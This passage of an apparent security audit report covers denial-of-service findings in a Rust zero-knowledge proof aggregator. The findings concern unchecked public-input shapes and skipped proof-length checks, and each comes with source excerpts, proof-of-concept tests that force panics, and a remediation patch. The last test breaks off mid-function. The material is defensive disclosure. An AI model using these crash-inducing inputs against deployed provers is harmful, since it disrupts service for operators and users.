     pub fn verify(&self, proof: ProofWithPublicInputs<F, C, D>) -> anyhow::Result<()> {
         self.verify_ref(&proof)
     }
 }
```

### Affected files
- `wormhole/inputs/src/lib.rs`
- `wormhole/aggregator/src/config.rs`
- `wormhole/aggregator/src/lib.rs`
- `wormhole/aggregator/src/common/utils.rs`
- `wormhole/aggregator/src/private_batch/circuit/build.rs`
- `wormhole/aggregator/src/public_batch/circuit/build.rs`
- `wormhole/memprof/src/main.rs`
- `wormhole/circuit/src/inputs.rs`
- `wormhole/verifier/src/lib.rs`

### Validation output

```
[output truncated: 189 lines & 12.0283203125 KB skipped]
   Compiling qp-wormhole-verifier v3.0.0 (/repo/wormhole/verifier)
   Compiling qp-wormhole-circuit v3.0.0 (/repo/wormhole/circuit)
   Compiling qp-wormhole-prover v3.0.0 (/repo/wormhole/prover)
   Compiling test-helpers v3.0.0 (/repo/wormhole/tests/test-helpers)
   Compiling qp-wormhole-aggregator v3.0.0 (/repo/wormhole/aggregator)
   Compiling qp-wormhole-circuit-builder v3.0.0 (/repo/wormhole/circuit-builder)
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 9.24s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Unchecked private-batch PI shape can panic public-batch construction
**#97071**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/public_batch/prover/lib.rs`
#### Lines 115-129 — _The byte-loading constructor combines loaded private-batch common data with an external leaf-count tuple._ — _`new_from_bytes` uses deserialized private-batch verifier data and caller-provided config to reconstruct public-batch targets._

```
        let private_batch_verifier_data = load_verifier_data_from_bytes(
            private_batch_common_bytes,
            private_batch_verifier_only_bytes,
            "private_batch",
        )?;

        let (num_leaf_proofs, num_private_batch_proofs) = config;

        let circuit = PublicBatchCircuit::new(
            public_batch_common.config.clone(),
            private_batch_verifier_data.common.clone(),
            &private_batch_verifier_data.verifier_only,
            num_private_batch_proofs,
            num_leaf_proofs,
        );
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs` (6 locations)
#### Lines 61-70 — _Private-batch public-input length is checked only by `debug_assert_eq!`._

```
        let expected_l0_pi_len = pbc::private_batch_pi_len(private_batch_num_leaves);

        debug_assert_eq!(
            private_batch_common.num_public_inputs,
            expected_l0_pi_len,
            "private_batch_common.num_public_inputs ({}) != expected private_batch PI len ({}) for private_batch_num_leaves={}",
            private_batch_common.num_public_inputs,
            expected_l0_pi_len,
            private_batch_num_leaves,
        );
```

⋯
#### Lines 160-187 — _The builder later indexes fixed private-batch PI offsets into the target slice._ — _The per-proof public-input slice length is also only debug-asserted before fixed offset indexing._

```
    let private_batch_pi_len = pbc::private_batch_pi_len(private_batch_num_leaves);
    let private_batch_exit_slots_per_proof =
        pbc::private_batch_exit_slots_count(private_batch_num_leaves);
    let private_batch_nullifiers_per_proof =
        pbc::private_batch_nullifiers_count(private_batch_num_leaves);

    // Convenience: references to each child proof's PI slice
    let private_batch_pi_targets: Vec<&[Target]> = targets
        .private_batch_proofs
        .iter()
        .map(|p| p.public_inputs.as_slice())
        .collect();

    debug_assert!(private_batch_pi_targets
        .iter()
        .all(|pis| pis.len() == private_batch_pi_len));

    // -------------------------------------------------------------------------
    // Dummy detection (sentinel: inner block_hash == 0, i.e. an all-dummy
    // private batch, mirroring the leaf-level sentinel one layer down)
    // -------------------------------------------------------------------------
    let dummy_sentinel = [zero, zero, zero, zero];
    let mut is_dummy_flags: Vec<BoolTarget> = Vec::with_capacity(n_inner);
    let mut block_hashes: Vec<[Target; 4]> = Vec::with_capacity(n_inner);
    for pis_i in private_batch_pi_targets.iter().take(n_inner) {
        let block_i: [Target; 4] =
            core::array::from_fn(|j| pis_i[pbc::PRIVATE_BATCH_BLOCK_HASH_OFFSET + j]);
        let is_dummy_i = bytes_digest_eq(builder, block_i, dummy_sentinel);
```

⋯
#### Lines 184-190 — _offset indexing into child PI slice_

```
    for pis_i in private_batch_pi_targets.iter().take(n_inner) {
        let block_i: [Target; 4] =
            core::array::from_fn(|j| pis_i[pbc::PRIVATE_BATCH_BLOCK_HASH_OFFSET + j]);
        let is_dummy_i = bytes_digest_eq(builder, block_i, dummy_sentinel);
        is_dummy_flags.push(is_dummy_i);
        block_hashes.push(block_i);
    }
```

⋯
#### Lines 210-219 — _Further fixed-offset metadata reads depend on the unchecked private-batch PI layout._

```
        let pis_i = private_batch_pi_targets[i];
        block_number_ref = builder.select(
            take_i,
            pis_i[pbc::PRIVATE_BATCH_BLOCK_NUMBER_OFFSET],
            block_number_ref,
        );
        asset_ref = builder.select(take_i, pis_i[pbc::PRIVATE_BATCH_ASSET_ID_OFFSET], asset_ref);
        fee_ref = builder.select(
            take_i,
            pis_i[pbc::PRIVATE_BATCH_VOLUME_FEE_BPS_OFFSET],
```

⋯
#### Lines 270-292 — _Exit-slot and nullifier forwarding performs derived fixed-offset indexing based on the unchecked leaf count._

```
    let exit_slots_start = pbc::private_batch_exit_slots_start();
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for slot_idx in 0..private_batch_exit_slots_per_proof {
            let slot_base = exit_slots_start + slot_idx * pbc::PRIVATE_BATCH_EXIT_SLOT_LEN;
            // [sum(1), exit_account(4)]
            for j in 0..pbc::PRIVATE_BATCH_EXIT_SLOT_LEN {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[slot_base + j]);
                output_pis.push(forwarded);
            }
        }
    }

    // 6) Forward nullifiers from all private-batch proofs, zeroing dummy inners'
    //    nullifiers. This lets the chain skip them (no storage bloat) and lets a
    //    single dummy proof template fill several slots without collisions. Real
    //    nullifiers are hash outputs and are never zero.
    let nullifiers_start = pbc::private_batch_nullifiers_start(private_batch_num_leaves);
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for n_idx in 0..private_batch_nullifiers_per_proof {
            let base = nullifiers_start + n_idx * 4;
            for j in 0..4 {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[base + j]);
                output_pis.push(forwarded);
```

⋯
#### Lines 286-295 — _nullifier-region offset indexing_

```
    let nullifiers_start = pbc::private_batch_nullifiers_start(private_batch_num_leaves);
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for n_idx in 0..private_batch_nullifiers_per_proof {
            let base = nullifiers_start + n_idx * 4;
            for j in 0..4 {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[base + j]);
                output_pis.push(forwarded);
            }
        }
    }
```

### `wormhole/aggregator/src/common/utils.rs`
#### Lines 59-86 — _A fallible parser exists for deriving the leaf count from private-batch PI length but is not used by this constructor._

```
pub fn private_batch_num_leaves_from_padded_pi_len(pi_len: usize) -> Result<usize> {
    if pi_len < aggregated_output::HEADER_LEN {
        return Err(anyhow!(
            "private-batch aggregated public input length {} is smaller than the fixed header {}",
            pi_len,
            aggregated_output::HEADER_LEN
        ));
    }

    let payload_len = pi_len - aggregated_output::HEADER_LEN;
    if !payload_len.is_multiple_of(LEAF_PI_LEN) {
        return Err(anyhow!(
            "private-batch aggregated public input length {} is malformed: expected {} + N*{}",
            pi_len,
            aggregated_output::HEADER_LEN,
            LEAF_PI_LEN
        ));
    }

    let num_leaves = payload_len / LEAF_PI_LEN;
    if num_leaves == 0 {
        return Err(anyhow!(
            "private-batch aggregated public input length {} encodes zero leaves",
            pi_len
        ));
    }

    Ok(num_leaves)
```

## Description

The public-batch builder trusts a caller-supplied `num_leaf_proofs` configuration even though the loaded private-batch artifact already determines the expected public-input layout. In `PublicBatchCircuit::new`, the only check that `private_batch_common.num_public_inputs` matches `pbc::private_batch_pi_len(private_batch_num_leaves)` is a `debug_assert_eq!`, so release builds proceed without enforcing the invariant. `build_public_batch_constraints` then derives offsets for header fields, exit slots, and nullifiers from that leaf count and indexes directly into each child proof's `public_inputs` slice. If the private-batch `CommonCircuitData` is malformed, stale, or simply inconsistent with the provided config, those offset reads can go out of bounds during circuit construction. The same fix covers all reported variants: derive or validate `num_leaf_proofs` from `private_batch_common.num_public_inputs` at runtime and return an error before any fixed-offset indexing occurs.

## Root cause

The code enforces the private-batch public-input shape invariant with release-stripped `debug_assert!` checks instead of runtime validation before offset-based indexing into `public_inputs`.

## Impact

An attacker or misconfigured deployment that supplies inconsistent private-batch artifacts can crash public-batch prover initialization before proof verification completes. This causes denial of service for aggregation or artifact-loading workflows and can also make mixed-version artifact sets fail unpredictably instead of being rejected cleanly.

## Proof of concept

### Test case

```
use anyhow::Result;
use circuit_builder::generate_all_circuit_binaries;
use std::{
    fs,
    panic::{catch_unwind, AssertUnwindSafe},
    path::{Path, PathBuf},
    process,
    time::{SystemTime, UNIX_EPOCH},
};
use wormhole_aggregator::public_batch::prover::PublicBatchProver;

fn unique_artifact_dir() -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock drift")
        .as_nanos();
    std::env::temp_dir().join(format!(
        "qp-zk-circuits-public-batch-poc-{}-{}",
        process::id(),
        nanos
    ))
}

fn read_bin(dir: &Path, name: &str) -> Vec<u8> {
    fs::read(dir.join(name)).unwrap_or_else(|e| panic!("failed to read {name}: {e}"))
}

fn panic_payload_to_string(payload: Box<dyn core::any::Any + Send>) -> String {
    match payload.downcast::<String>() {
        Ok(msg) => *msg,
        Err(payload) => match payload.downcast::<&'static str>() {
            Ok(msg) => (*msg).to_string(),
            Err(_) => "non-string panic payload".to_string(),
        },
    }
}

#[test]
fn mismatched_private_batch_pi_shape_panics_during_public_batch_prover_init() -> Result<()> {
    let bins_dir = unique_artifact_dir();
    generate_all_circuit_binaries(&bins_dir, true, 1, Some(1))?;

    let public_batch_prover_only_bytes = read_bin(&bins_dir, "public_batch_prover.bin");
    let public_batch_common_bytes = read_bin(&bins_dir, "public_batch_common.bin");
    let private_batch_common_bytes = read_bin(&bins_dir, "private_batch_common.bin");
    let private_batch_verifier_only_bytes = read_bin(&bins_dir, "private_batch_verifier.bin");
    let dummy_private_batch_proof_bytes = read_bin(&bins_dir, "dummy_private_batch_proof.bin");

    PublicBatchProver::new_from_bytes(
        &public_batch_prover_only_bytes,
        &public_batch_common_bytes,
        &private_batch_common_bytes,
        &private_batch_verifier_only_bytes,
        &dummy_private_batch_proof_bytes,
        (1, 1),
    )
    .expect("matched artifacts must initialize the public-batch prover");

    let panic = catch_unwind(AssertUnwindSafe(|| {
        let _ = PublicBatchProver::new_from_bytes(
            &public_batch_prover_only_bytes,
            &public_batch_common_bytes,
            &private_batch_common_bytes,
            &private_batch_verifier_only_bytes,
            &dummy_private_batch_proof_bytes,
            (2, 1),
        );
    }))
    .expect_err("forged num_leaf_proofs must panic in release instead of returning Err");

    let panic_message = panic_payload_to_string(panic);
    assert!(
        panic_message.contains("index out of bounds"),
        "expected an out-of-bounds panic from fixed-offset PI indexing, got: {panic_message}"
    );

    let _ = fs::remove_dir_all(&bins_dir);
    Ok(())
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
mkdir -p /tmp/qp-zk-circuits-runpoc-target && CARGO_TARGET_DIR=/tmp/qp-zk-circuits-runpoc-target cargo test -p tests --test poc --release -- --nocapture
```

### Output

```
[output truncated: 180 lines & 7.3330078125 KB skipped]
   2: core::panicking::panic_bounds_check
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/panicking.rs:271:5
   3: qp_wormhole_aggregator::public_batch::circuit::circuit_logic::PublicBatchCircuit::new
   4: qp_wormhole_aggregator::public_batch::prover::lib::PublicBatchProver::new_from_bytes
   5: core::ops::function::FnOnce::call_once
   6: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.

</test-stderr>
```

### Considerations

PoC demonstrates the constructor-time DoS through the real public entry point `PublicBatchProver::new_from_bytes` in a native `cargo test --release` run, using genuine generated artifacts and a forged `(num_leaf_proofs, num_private_batch_proofs)` config tuple. It proves the release-build panic path (`index out of bounds` in `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs:291`) and would fail if patched to return `Err` instead. The harness required an inline `CARGO_TARGET_DIR=/tmp/...` override because the default repo-local release target path was unstable in this environment; this does not change the exercised code path.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

PublicBatchProver::new_from_bytes now derives the private-batch leaf count from private_batch_common.num_public_inputs and rejects mismatched caller config with Err before constructing the public-batch circuit. This prevents the fixed-offset public-input indexing panic triggered by inconsistent private-batch artifacts/config tuples.

### Patch

```diff
diff --git a/wormhole/aggregator/src/public_batch/prover/lib.rs b/wormhole/aggregator/src/public_batch/prover/lib.rs
--- a/wormhole/aggregator/src/public_batch/prover/lib.rs
+++ b/wormhole/aggregator/src/public_batch/prover/lib.rs
@@ -1,267 +1,278 @@
 //! Public-batch aggregation prover (prebuilt-circuit proving API).
 //!
 //! The private-batch verifier key is baked in as constants at circuit build time to prevent
 //! verifier key substitution attacks.
 
 use anyhow::{anyhow, bail, Context, Result};
 #[cfg(feature = "std")]
 use plonky2::{
     iop::witness::PartialWitness,
     plonk::{
         circuit_data::{
             CircuitConfig, CommonCircuitData, ProverCircuitData, ProverOnlyCircuitData,
             VerifierOnlyCircuitData,
         },
         proof::ProofWithPublicInputs,
     },
     util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
 };
 use qp_wormhole_inputs::BytesDigest;
 
 #[cfg(feature = "std")]
 use std::{fs, path::Path};
 
 use zk_circuits_common::{
     circuit::{C, D, F},
     utils::bytes_to_digest,
 };
 
 use crate::{
-    common::utils::load_verifier_data_from_bytes,
+    common::utils::{load_verifier_data_from_bytes, private_batch_num_leaves_from_padded_pi_len},
     public_batch::{
         circuit::circuit_logic::{PublicBatchCircuit, PublicBatchCircuitTargets},
         prover::witness::fill_public_batch_witness,
     },
 };
 
 #[derive(Debug)]
 pub struct PublicBatchInputs {
     pub proofs: Vec<ProofWithPublicInputs<F, C, D>>,
     pub aggregator_address: BytesDigest,
 }
 
 #[derive(Debug)]
 pub struct PublicBatchProver {
     pub circuit_data: ProverCircuitData<F, C, D>,
     partial_witness: PartialWitness<F>,
     targets: Option<PublicBatchCircuitTargets>,
     num_private_batch_proofs: usize,
     /// Dummy private-batch proof (over all-dummy leaves, `block_hash == 0`) used to
     /// pad partial public batches. The circuit zeroes dummy inners' exit slots and
     /// nullifiers, so one template can fill several slots without collisions.
     dummy_proof_template: ProofWithPublicInputs<F, C, D>,
 }
 
 impl PublicBatchProver {
     /// Build a fresh public-batch aggregation prover from circuit definitions.
     ///
     /// In production, prefer `new_from_binaries_dir(...)` to load prebuilt circuits.
     #[allow(clippy::too_many_arguments)]
     pub fn new(
         public_batch_circuit_config: CircuitConfig,
         private_batch_common: CommonCircuitData<F, D>,
         private_batch_verifier_only: &VerifierOnlyCircuitData<C, D>,
         num_private_batch_proofs: usize,
         private_batch_num_leaves: usize,
         dummy_proof_template: ProofWithPublicInputs<F, C, D>,
     ) -> Self {
         let public_batch_circuit = PublicBatchCircuit::new(
             public_batch_circuit_config,
             private_batch_common,
             private_batch_verifier_only,
             num_private_batch_proofs,
             private_batch_num_leaves,
         );
 
         let targets = Some(public_batch_circuit.targets());
         let circuit_data = public_batch_circuit.build_prover();
 
         Self {
             circuit_data,
             partial_witness: PartialWitness::new(),
             targets,
             num_private_batch_proofs,
             dummy_proof_template,
         }
     }
 
     /// Create a public-batch prover from serialized bytes.
     pub fn new_from_bytes(
         public_batch_prover_only_bytes: &[u8],
         public_batch_common_bytes: &[u8],
         private_batch_common_bytes: &[u8],
         private_batch_verifier_only_bytes: &[u8],
         dummy_private_batch_proof_bytes: &[u8],
         config: (usize, usize), // (num_leaf_proofs, num_private_batch_proofs)
     ) -> Result<Self> {
         let gate_serializer = DefaultGateSerializer;
         let generator_serializer = DefaultGeneratorSerializer::<C, D> {
             _phantom: Default::default(),
         };
 
         // 1) Load prebuilt public-batch circuit prover data
         let public_batch_common =
             CommonCircuitData::from_bytes(public_batch_common_bytes.to_vec(), &gate_serializer)
                 .map_err(|e| anyhow!("failed to deserialize public_batch common data: {}", e))?;
 
         let public_batch_prover_only = ProverOnlyCircuitData::from_bytes(
             public_batch_prover_only_bytes,
             &generator_serializer,
             &public_batch_common,
         )
         .map_err(|e| anyhow!("failed to deserialize public_batch prover data: {}", e))?;
 
         // 2) Load private-batch verifier data (needed for witness filling and dummy proof parsing)
         let private_batch_verifier_data = load_verifier_data_from_bytes(
             private_batch_common_bytes,
             private_batch_verifier_only_bytes,
             "private_batch",
         )?;
 
         let (num_leaf_proofs, num_private_batch_proofs) = config;
+        let derived_num_leaf_proofs = private_batch_num_leaves_from_padded_pi_len(
+            private_batch_verifier_data.common.num_public_inputs,
+        )?;
+        if num_leaf_proofs != derived_num_leaf_proofs {
+            bail!(
+                "num_leaf_proofs mismatch: config={}, derived={} from private_batch_common.num_public_inputs={}",
+                num_leaf_proofs,
+                derived_num_leaf_proofs,
+                private_batch_verifier_data.common.num_public_inputs,
+            );
+        }
 
         let circuit = PublicBatchCircuit::new(
             public_batch_common.config.clone(),
             private_batch_verifier_data.common.clone(),
             &private_batch_verifier_data.verifier_only,
             num_private_batch_proofs,
             num_leaf_proofs,
         );
 
         let targets = Some(circuit.targets());
 
         // 3) Load the dummy private-batch proof template used to pad partial batches
         let dummy_proof_template = ProofWithPublicInputs::<F, C, D>::from_bytes(
             dummy_private_batch_proof_bytes.to_vec(),
             &private_batch_verifier_data.common,
         )
         .map_err(|e| anyhow!("failed to deserialize dummy private-batch proof: {}", e))?;
 
         Ok(Self {
             circuit_data: ProverCircuitData {
                 prover_only: public_batch_prover_only,
                 common: public_batch_common,
             },
             partial_witness: PartialWitness::new(),
             targets,
             num_private_batch_proofs,
             dummy_proof_template,
         })
     }
 
     #[cfg(feature = "std")]
     #[allow(clippy::too_many_arguments)]
     pub fn new_from_files(
         public_batch_prover_path: &Path,
         public_batch_common_path: &Path,
         private_batch_common_path: &Path,
         private_batch_verifier_path: &Path,
         dummy_private_batch_proof_path: &Path,
         config: (usize, usize),
     ) -> Result<Self> {
         let public_batch_prover_only_bytes = fs::read(public_batch_prover_path)
             .with_context(|| format!("Failed to read {:?}", public_batch_prover_path))?;
         let public_batch_common_bytes = fs::read(public_batch_common_path)
             .with_context(|| format!("Failed to read {:?}", public_batch_common_path))?;
 
         let private_batch_common_bytes = fs::read(private_batch_common_path)
             .with_context(|| format!("Failed to read {:?}", private_batch_common_path))?;
         let private_batch_verifier_only_bytes = fs::read(private_batch_verifier_path)
             .with_context(|| format!("Failed to read {:?}", private_batch_verifier_path))?;
         let dummy_private_batch_proof_bytes = fs::read(dummy_private_batch_proof_path)
             .with_context(|| format!("Failed to read {:?}", dummy_private_batch_proof_path))?;
 
         Self::new_from_bytes(
             &public_batch_prover_only_bytes,
             &public_batch_common_bytes,
             &private_batch_common_bytes,
             &private_batch_verifier_only_bytes,
             &dummy_private_batch_proof_bytes,
             config,
         )
     }
 
     /// Convenience constructor from a generated binaries directory.
     ///
     /// Expected files:
     /// - `public_batch_prover.bin`
     /// - `public_batch_common.bin`
     /// - `private_batch_common.bin`             (private-batch common)
     /// - `private_batch_verifier.bin`           (private-batch verifier-only)
     /// - `dummy_private_batch_proof.bin`        (padding template)
     /// - `config.json`
     ///
     #[cfg(feature = "std")]
     pub fn new_from_binaries_dir(bins_dir: &Path) -> Result<Self> {
         let bins_config = crate::config::CircuitBinsConfig::load(bins_dir)?;
 
         let num_private_batch_proofs = bins_config.num_private_batch_proofs.ok_or_else(|| {
             anyhow!(
                 "config is missing num_private_batch_proofs. Regenerate binaries with num_private_batch_proofs set."
             )
         })?;
         let config = (bins_config.num_leaf_proofs, num_private_batch_proofs);
 
         Self::new_from_files(
             &bins_dir.join("public_batch_prover.bin"),
             &bins_dir.join("public_batch_common.bin"),
             &bins_dir.join("private_batch_common.bin"),
             &bins_dir.join("private_batch_verifier.bin"),
             &bins_dir.join("dummy_private_batch_proof.bin"),
             config,
         )
     }
 
     pub fn num_private_batch_proofs(&self) -> usize {
         self.num_private_batch_proofs
     }
 
     /// Commit private-batch aggregated proofs into the public-batch circuit witness.
     ///
     /// Partial batches are padded with the dummy private-batch proof template.
     /// The circuit exempts dummies (`block_hash == 0`) from metadata consistency
     /// and zeroes their forwarded exit slots and nullifiers.
     pub fn commit(mut self, inputs: PublicBatchInputs) -> Result<Self> {
         let Some(targets) = self.targets.take() else {
             bail!("public-batch aggregation prover has already committed to inputs");
         };
 
         let mut proofs = inputs.proofs;
         let aggregator_address = inputs.aggregator_address;
 
         let aggregator_address_felts = bytes_to_digest(aggregator_address);
 
         if proofs.is_empty() {
             bail!("no private-batch proofs to aggregate");
         }
         if proofs.len() > self.num_private_batch_proofs {
             bail!(
                 "Expected at most {} private-batch proofs, but got {}",
                 self.num_private_batch_proofs,
                 proofs.len()
             );
         }
 
         // Pad partial batches with the dummy template. No shuffle: forwarding is
         // order-preserving by design (per-segment attribution on-chain).
         let num_dummies_needed = self.num_private_batch_proofs - proofs.len();
         for _ in 0..num_dummies_needed {
             proofs.push(self.dummy_proof_template.clone());
         }
 
         fill_public_batch_witness(
             &mut self.partial_witness,
             &targets,
             &proofs,
             aggregator_address_felts,
         )?;
 
         Ok(self)
     }
 
     pub fn prove(self) -> Result<ProofWithPublicInputs<F, C, D>> {
         self.circuit_data
             .prove(self.partial_witness)
             .map_err(|e| anyhow!("Failed to prove public-batch aggregation circuit: {}", e))
     }
 }
```

### Affected files
- `wormhole/aggregator/src/public_batch/prover/lib.rs`

### Validation output

```
[output truncated: 45 lines & 2.6201171875 KB skipped]
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/std/src/panicking.rs:689:5
   1: core::panicking::panic_fmt
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/panicking.rs:80:14
   2: core::result::unwrap_failed
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/result.rs:1867:5
   3: core::ops::function::FnOnce::call_once
   4: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Full-batch direct commits skip proof length validation
**#97073**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/private_batch/prover/lib.rs` (2 locations)
#### Lines 228-269 — _Direct commit path validates proof count and only checks proof PI length when dummy padding is required before calling witness fill._ — _Length/asset-id validation only runs when num_dummies_needed > 0; full batches skip it and go straight to fill_private_batch_witness_

```
    pub fn commit(mut self, mut proofs: Vec<ProofWithPublicInputs<F, C, D>>) -> Result<Self> {
        let Some(targets) = self.targets.take() else {
            bail!("private-batch aggregation prover has already committed to inputs");
        };

        if proofs.len() > self.num_leaf_proofs {
            bail!(
                "too many proofs: got {}, expected at most {}",
                proofs.len(),
                self.num_leaf_proofs
            );
        }

        // If we're going to pad with dummy proofs (asset_id = 0), ensure real proofs are asset_id=0.
        let num_dummies_needed = self.num_leaf_proofs.saturating_sub(proofs.len());
        if num_dummies_needed > 0 {
            assert_dummy_padding_asset_id_compatible(&proofs)?;
        }

        // Pad with dummy proofs
        for _ in 0..num_dummies_needed {
            proofs.push(self.dummy_proof_template.clone());
        }

        // Uniformly shuffle proofs to hide dummy positions. The circuit selects its block
        // reference from the first non-dummy slot in-circuit, so no position is special.
        if proofs.len() > 1 {
            let mut rng = rand::thread_rng();
            proofs.shuffle(&mut rng);
        }

        // Generate one dummy nullifier preimage per slot.
        // In-circuit hashes these only for dummy proofs.
        let dummy_nullifier_pre_images =
            generate_dummy_nullifier_pre_images_for_slots(proofs.len());

        fill_private_batch_witness(
            &mut self.partial_witness,
            &targets,
            &proofs,
            &dummy_nullifier_pre_images,
        )?;
```

⋯
#### Lines 288-310 — _assert_dummy_padding_asset_id_compatible is the only commit-time caller of ensure_proof_public_input_len_

```
fn assert_dummy_padding_asset_id_compatible(
    proofs: &[ProofWithPublicInputs<F, C, D>],
) -> Result<()> {
    for (idx, proof) in proofs.iter().enumerate() {
        ensure_proof_public_input_len(
            proof,
            crate::private_batch::circuit::constants::LEAF_PI_LEN,
            "leaf proof",
        )?;
        let real_asset_id = leaf_proof_asset_id(proof)?;

        if real_asset_id != 0 {
            bail!(
                "real proof {} has asset_id={}, but dummy proofs use asset_id=0. \
                 All proofs must have the same asset_id for aggregation when padding is required.",
                idx,
                real_asset_id
            );
        }
    }

    Ok(())
}
```

### `wormhole/aggregator/src/private_batch/prover/witness.rs`
#### Lines 20-49 — _witness fill validates proof count but not per-proof public_inputs.len()_ — _Witness fill checks slice counts but not per-proof public-input length before delegating to proof target assignment._

```
    let n_targets = targets.leaf_proofs.len();

    if proofs.len() != n_targets {
        bail!(
            "proof count mismatch: got {}, but circuit expects {} leaf proofs",
            proofs.len(),
            n_targets
        );
    }

    if targets.dummy_nullifier_pre_images.len() != n_targets {
        bail!(
            "target layout is inconsistent: dummy_nullifier_pre_image target count {} != leaf proof target count {}",
            targets.dummy_nullifier_pre_images.len(),
            n_targets
        );
    }

    if dummy_nullifier_pre_images.len() != n_targets {
        bail!(
            "dummy nullifier preimage count mismatch: got {}, but circuit expects {}",
            dummy_nullifier_pre_images.len(),
            n_targets
        );
    }

    for (i, (proof_t, proof)) in targets.leaf_proofs.iter().zip(proofs.iter()).enumerate() {
        pw.set_proof_with_pis_target(proof_t, proof)
            .map_err(|e| anyhow!("failed to set leaf proof target at slot {}: {}", i, e))?;
    }
```

### `wormhole/aggregator/src/aggregator.rs`
#### Lines 284-286 — _Higher-level aggregator entrypoint performs the missing proof public-input length validation._

```
    fn push_proof(&mut self, proof: Proof) -> Result<()> {
        ensure_proof_public_input_len(&proof, self.expected_leaf_pi_len, "leaf proof")?;
        self.buf.push(proof)
```

### `wormhole/aggregator/src/common/utils.rs`
#### Lines 33-49 — _Reusable exact public-input length check exists but is not applied by the full-batch direct prover path._

```
pub fn ensure_proof_public_input_len(
    proof: &ProofWithPublicInputs<F, C, D>,
    expected_len: usize,
    label: &str,
) -> Result<()> {
    let actual_len = proof.public_inputs.len();
    if actual_len != expected_len {
        return Err(anyhow!(
            "{} public input length mismatch: expected {}, got {}",
            label,
            expected_len,
            actual_len
        ));
    }

    Ok(())
}
```

## Description

`PrivateBatchProver::commit` inconsistently validates proof public-input length across its call paths. When the batch is partial, it enters `assert_dummy_padding_asset_id_compatible`, which calls `ensure_proof_public_input_len`; when the batch is already full, that branch is skipped and the supplied proofs are forwarded directly to `fill_private_batch_witness`. The witness helper only verifies proof-count and dummy-preimage-count alignment, then passes each proof into `set_proof_with_pis_target` without a preflight check that `public_inputs.len()` matches the fixed target layout. As a result, a malformed full-batch `ProofWithPublicInputs` can reach witness assignment and fail there instead of being rejected cleanly at the API boundary. This differs from the higher-level aggregator flow, which already applies the same length check before buffering proofs.

## Root cause

`PrivateBatchProver::commit` gates `ensure_proof_public_input_len` behind `num_dummies_needed > 0`, so full batches bypass per-proof length validation before reaching witness assignment.

## Impact

A direct consumer of the public `PrivateBatchProver::commit` API can make proving abort by submitting a full batch containing a proof with the wrong number of public inputs. The issue does not let an attacker forge an aggregate proof, but it converts malformed input into a process-level availability failure or unexpected panic path for services that expose this lower-level interface.

## Proof of concept

### Test case

```
use circuit_builder::generate_all_circuit_binaries;
use plonky2::plonk::proof::ProofWithPublicInputs;
use std::any::Any;
use std::panic::{catch_unwind, AssertUnwindSafe};
use std::path::Path;
use std::sync::Once;
use test_helpers::TestInputs;
use wormhole_aggregator::private_batch::prover::PrivateBatchProver;
use wormhole_circuit::inputs::CircuitInputs;
use wormhole_prover::WormholeProver;
use zk_circuits_common::circuit::{C, D, F};

const TEST_OUTPUT_DIR: &str = "tmp-poc-private-batch-direct-commit-bins";
static TEST_INIT: Once = Once::new();

fn setup_test_binaries() {
    TEST_INIT.call_once(|| {
        generate_all_circuit_binaries(TEST_OUTPUT_DIR, true, 2, None)
            .expect("Failed to generate test circuit binaries");
    });
}

fn make_leaf_proof(inputs: &CircuitInputs) -> ProofWithPublicInputs<F, C, D> {
    setup_test_binaries();

    let prover = WormholeProver::new_from_files(
        Path::new(&format!("{TEST_OUTPUT_DIR}/prover.bin")),
        Path::new(&format!("{TEST_OUTPUT_DIR}/common.bin")),
    )
    .expect("Failed to load leaf prover from generated binaries");

    prover
        .commit(inputs)
        .expect("leaf commit should succeed")
        .prove()
        .expect("leaf proving should succeed")
}

fn make_private_batch_prover() -> PrivateBatchProver {
    setup_test_binaries();
    PrivateBatchProver::new_from_binaries_dir(Path::new(TEST_OUTPUT_DIR))
        .expect("Failed to load private-batch prover from generated binaries")
}

fn panic_message(payload: Box<dyn Any + Send>) -> String {
    match payload.downcast::<String>() {
        Ok(msg) => *msg,
        Err(payload) => match payload.downcast::<&'static str>() {
            Ok(msg) => (*msg).to_string(),
            Err(_) => "<non-string panic payload>".to_string(),
        },
    }
}

#[test]
fn full_batch_direct_commit_panics_in_witness_assignment_instead_of_cleanly_rejecting() {
    let valid_a = make_leaf_proof(&CircuitInputs::test_inputs_0());
    let valid_b = make_leaf_proof(&CircuitInputs::test_inputs_1());

    let mut malformed = valid_a.clone();
    let expected_len = malformed.public_inputs.len();
